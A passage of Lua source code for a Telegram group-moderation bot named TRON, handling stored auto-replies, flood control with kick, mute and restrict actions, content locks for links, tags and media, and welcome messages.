DevAbd:del(TRON..'Abd:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevAbd:del(TRON..'Abd:Gif:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbd:del(TRON..'Abd:Voice:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbd:del(TRON..'Abd:Audio:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbd:del(TRON..'Abd:Photo:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbd:del(TRON..'Abd:Stecker:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbd:del(TRON..'Abd:Video:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbd:del(TRON..'Abd:File:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbd:del(TRON..'Abd:Text:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbd:srem(TRON..'Abd:Manager:GpRed'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelAllRed = DevAbd:get(TRON.."Abd:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
DevAbd:del(TRON.."Abd:Add:AllRed"..msg.sender_user_id_)
DevAbd:del(TRON.."Abd:Gif:AllRed"..msg.content_.text_)
DevAbd:del(TRON.."Abd:Voice:AllRed"..msg.content_.text_)
DevAbd:del(TRON.."Abd:Audio:AllRed"..msg.content_.text_)
DevAbd:del(TRON.."Abd:Photo:AllRed"..msg.content_.text_)
DevAbd:del(TRON.."Abd:Stecker:AllRed"..msg.content_.text_)
DevAbd:del(TRON.."Abd:Video:AllRed"..msg.content_.text_)
DevAbd:del(TRON.."Abd:File:AllRed"..msg.content_.text_)
DevAbd:del(TRON.."Abd:Text:AllRed"..msg.content_.text_)
DevAbd:del(TRON.."Abd:Sudo:AllRed",msg.content_.text_)
return false
end
end
--     Source TRON     --
if text and text:match("^(.*)$") then
local SaveGpRedod = DevAbd:get(TRON..'Abd:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRedod == 'SaveGpRedod' then
local GetGpTexts = DevAbd:get(TRON..'Abd:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevAbd:smembers(TRON..'Abd:Text:GpTexts'..GetGpTexts..msg.chat_id_)
if text == "الغاء" then 
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙⌁︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
DevAbd:del(TRON..'Abd:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevAbd:del(TRON..'Abd:Text:GpTexts'..GetGpTexts..msg.chat_id_)
DevAbd:del(TRON..'Abd:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
DevAbd:srem(TRON..'Abd:Manager:GpRedod'..msg.chat_id_,GetGpTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevAbd:sadd(TRON..'Abd:Text:GpTexts'..GetGpTexts..msg.chat_id_,Text)
if #List == 4 then 
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ ↫ 5 من الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
DevAbd:del(TRON..'Abd:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
local Abd = "⌁︙تم حفظ الرد رقم ↫ "..(#List+1).."\n⌁︙قم بارسال الرد رقم ↫ "..(#List+2)
keyboard = {} 
keyboard.inline_keyboard = {{{text="انهاء وحفظ "..(#List+1).." من الردود",callback_data="/EndRedod:"..msg.sender_user_id_..GetGpTexts}},{{text="الغاء وحذف التخزين",callback_data="/DelRedod:"..msg.sender_user_id_..GetGpTexts}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Abd).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
end
if text and not DevAbd:get(TRON..'Abd:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_) then
if DevAbd:sismember(TRON..'Abd:Manager:GpRedod'..msg.chat_id_,text) then
local TRONTEAM =  DevAbd:smembers(TRON..'Abd:Text:GpTexts'..text..msg.chat_id_)
Dev_Abd(msg.chat_id_, msg.id_, 1, '['..TRONTEAM[math.random(#TRONTEAM)]..']' , 1, 'md')  
end
end
--     Source TRON     --
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = DevAbd:get(TRON..'Abd:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRed == 'SaveGpRed' then 
if text == 'الغاء' then
local DelManagerRep = DevAbd:get(TRON..'DelManagerRep'..msg.chat_id_)
DevAbd:srem(TRON..'Abd:Manager:GpRed'..msg.chat_id_,DelManagerRep)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ الرد', 1, 'md')
DevAbd:del(TRON..'Abd:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevAbd:del(TRON..'Abd:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevAbd:del(TRON..'DelManagerRep'..msg.chat_id_)
return false
end
DevAbd:del(TRON..'Abd:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
local SaveGpRed = DevAbd:get(TRON..'Abd:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
if msg.content_.video_ then DevAbd:set(TRON..'Abd:Video:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then DevAbd:set(TRON..'Abd:File:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then DevAbd:set(TRON..'Abd:Stecker:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevAbd:set(TRON..'Abd:Voice:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then DevAbd:set(TRON..'Abd:Audio:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_) 
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevAbd:set(TRON..'Abd:Photo:GpRed'..SaveGpRed..msg.chat_id_, photo_in_group) 
end
if msg.content_.animation_ then DevAbd:set(TRON..'Abd:Gif:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevAbd:set(TRON..'Abd:Text:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.text_)
end 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الرد الجديد', 1, 'md') 
DevAbd:del(TRON..'Abd:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevAbd:del(TRON..'DelManagerRep'..msg.chat_id_)
return false 
end 
end
if msg.content_.text_ and not DevAbd:get(TRON..'Abd:Lock:GpRed'..msg.chat_id_) then 
if DevAbd:get(TRON..'Abd:Video:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevAbd:get(TRON..'Abd:Video:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevAbd:get(TRON..'Abd:File:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevAbd:get(TRON..'Abd:File:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevAbd:get(TRON..'Abd:Voice:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevAbd:get(TRON..'Abd:Voice:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevAbd:get(TRON..'Abd:Audio:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevAbd:get(TRON..'Abd:Audio:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevAbd:get(TRON..'Abd:Photo:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevAbd:get(TRON..'Abd:Photo:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevAbd:get(TRON..'Abd:Gif:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevAbd:get(TRON..'Abd:Gif:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevAbd:get(TRON..'Abd:Stecker:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevAbd:get(TRON..'Abd:Stecker:GpRed'..msg.content_.text_..msg.chat_id_))
end
if DevAbd:get(TRON..'Abd:Text:GpRed'..msg.content_.text_..msg.chat_id_) then
function TRONTEAM(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevAbd:get(TRON..'Abd:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevAbd:get(TRON..'Abd:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevAbd:get(TRON..'Abd:Text:GpRed'..msg.content_.text_..msg.chat_id_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, TRONTEAM)
end
end
--     Source TRON     --
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = DevAbd:get(TRON.."Abd:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'الغاء' then
local DelSudoRep = DevAbd:get(TRON..'DelSudoRep')
DevAbd:del(TRON.."Abd:Sudo:AllRed",DelSudoRep)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ الرد', 1, 'md')
DevAbd:del(TRON.."Abd:Add:AllText"..msg.sender_user_id_)
DevAbd:del(TRON.."Abd:Add:AllRed"..msg.sender_user_id_)
DevAbd:del(TRON.."DelSudoRep")
return false
end
DevAbd:del(TRON.."Abd:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = DevAbd:get(TRON.."Abd:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
DevAbd:set(TRON.."Abd:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
DevAbd:set(TRON.."Abd:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
DevAbd:set(TRON.."Abd:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevAbd:set(TRON.."Abd:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevAbd:set(TRON.."Abd:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_all_groups = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_all_groups = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_all_groups = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_all_groups = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevAbd:set(TRON.."Abd:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
DevAbd:set(TRON.."Abd:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevAbd:set(TRON.."Abd:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الرد الجديد', 1, 'md') 
DevAbd:del(TRON.."Abd:Add:AllText"..msg.sender_user_id_)
DevAbd:del(TRON..'DelSudoRep')
return false end end
if msg.content_.text_ and not DevAbd:get(TRON..'Abd:Lock:AllRed'..msg.chat_id_) then
if DevAbd:get(TRON.."Abd:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevAbd:get(TRON.."Abd:Video:AllRed"..msg.content_.text_))
end
if DevAbd:get(TRON.."Abd:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevAbd:get(TRON.."Abd:File:AllRed"..msg.content_.text_))
end
if DevAbd:get(TRON.."Abd:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevAbd:get(TRON.."Abd:Voice:AllRed"..msg.content_.text_))
end
if DevAbd:get(TRON.."Abd:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevAbd:get(TRON.."Abd:Audio:AllRed"..msg.content_.text_))
end
if DevAbd:get(TRON.."Abd:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevAbd:get(TRON.."Abd:Photo:AllRed"..msg.content_.text_))
end
if  DevAbd:get(TRON.."Abd:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevAbd:get(TRON.."Abd:Gif:AllRed"..msg.content_.text_))
end
if DevAbd:get(TRON.."Abd:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevAbd:get(TRON.."Abd:Stecker:AllRed"..msg.content_.text_))
end
if DevAbd:get(TRON.."Abd:Text:AllRed"..msg.content_.text_) then
function TRONTEAM(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevAbd:get(TRON..'Abd:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevAbd:get(TRON..'Abd:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevAbd:get(TRON.."Abd:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, TRONTEAM)
end
end 
--     Source TRON     --
--       Spam Send        --
function NotSpam(msg,Type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
local GetName = '['..dp.first_name_..'](tg://user?id='..dp.id_..')'
if Type == "kick" then 
ChatKick(msg.chat_id_,msg.sender_user_id_) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '⌁︙العضو ↫ '..GetName..' \n⌁︙قام بالتكرار المحدد تم طرده '
SendText(msg.chat_id_,Text,0,'md')
return false  
end 
if Type == "del" then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false  
end 
if Type == "keed" and not DevAbd:sismember(TRON..'Abd:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_.."") 
DevAbd:sadd(TRON..'Abd:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '⌁︙العضو ↫ '..GetName..' \n⌁︙قام بالتكرار المحدد تم تقيده '
SendText(msg.chat_id_,Text,0,'md')
return false  
end  
if Type == "mute" and not DevAbd:sismember(TRON..'Abd:Muted:'..msg.chat_id_, msg.sender_user_id_) then
DevAbd:sadd(TRON..'Abd:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '⌁︙العضو ↫ '..GetName..' \n⌁︙قام بالتكرار المحدد تم كتمه '
SendText(msg.chat_id_,Text,0,'md')
return false  
end
end,nil)
end  
--  end functions TRON --
--     Source TRON     --
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevAbd:hget(TRON.."Abd:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= TRON then
floods = DevAbd:hget(TRON.."Abd:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = DevAbd:hget(TRON.."Abd:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = DevAbd:hget(TRON.."Abd:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(DevAbd:get(TRON.."Abd:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(DevAbd:hget(TRON.."Abd:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = DevAbd:hget(TRON.."Abd:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
DevAbd:setex(TRON.."Abd:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevAbd:hget(TRON.."Abd:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if DevAbd:hget(TRON.."Abd:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = DevAbd:hget(TRON.."Abd:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if DevAbd:hget(TRON.."Abd:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = DevAbd:hget(TRON.."Abd:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--     Source TRON     --
----- START MSG CHECKS -----
if msg.sender_user_id_ and Ban(msg.sender_user_id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and BanAll(msg.sender_user_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and Muted(msg.sender_user_id_, msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and MuteAll(msg.sender_user_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.content_.ID == "MessagePinMessage" then
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(TRON) then
DevAbd:set(TRON..'Abd:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = DevAbd:get(TRON..'Abd:PinnedMsg'..msg.chat_id_)
if pin_id and DevAbd:get(TRON..'Abd:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if DevAbd:get(TRON..'Abd:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevAbd:del(TRON..'Abd:viewget'..msg.sender_user_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙عدد مشاهدات المنشور هي ↫ ('..msg.views_..')', 1, 'md')
DevAbd:del(TRON..'Abd:viewget'..msg.sender_user_id_)
end
end
--     Source TRON     --
--         Photo          --
if msg.content_.ID == "MessagePhoto" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbd:get(TRON..'Abd:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbd:get(TRON..'Abd:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbd:get(TRON..'Abd:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbd:get(TRON..'Abd:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbd:get(TRON..'Abd:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbd:get(TRON..'Abd:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbd:get(TRON..'Abd:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbd:get(TRON..'Abd:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source TRON     --
--        Markdown        --
elseif not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
if DevAbd:get(TRON..'Abd:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source TRON     --
--        Document        --
elseif msg.content_.ID == "MessageDocument" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbd:get(TRON..'Abd:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbd:get(TRON..'Abd:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbd:get(TRON..'Abd:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbd:get(TRON..'Abd:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbd:get(TRON..'Abd:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbd:get(TRON..'Abd:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbd:get(TRON..'Abd:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbd:get(TRON..'Abd:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source TRON     --
--         Inline         --
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not VipMem(msg) then
if DevAbd:get(TRON..'Abd:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source TRON     --
--        Sticker         --
elseif msg.content_.ID == "MessageSticker" then
if not VipMem(msg) then
if DevAbd:get(TRON..'Abd:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
elseif msg.content_.ID == "MessageChatJoinByLink" then
if DevAbd:get(TRON..'Abd:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
function get_welcome(extra,result,success)
if DevAbd:get(TRON..'Abd:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevAbd:get(TRON..'Abd:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• username'
end
local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
local Welcomes = Welcomes:gsub('firstname',('['..result.first_name_..']' or ''))
local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@YYYYAX]'))
Dev_Abd(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end 
if DevAbd:get(TRON.."Abd:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     Source TRON     --
--      New User Add      --
elseif msg.content_.ID == "MessageChatAddMembers" then
if not DevAbd:get(TRON..'Abd:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = TRON,offset_ = 0,limit_ = 1},function(extra,abbas,success) 
for i=0,#msg.content_.members_ do    
BotWelcome = msg.content_.members_[i].id_    
if BotWelcome and BotWelcome == tonumber(TRON) then 
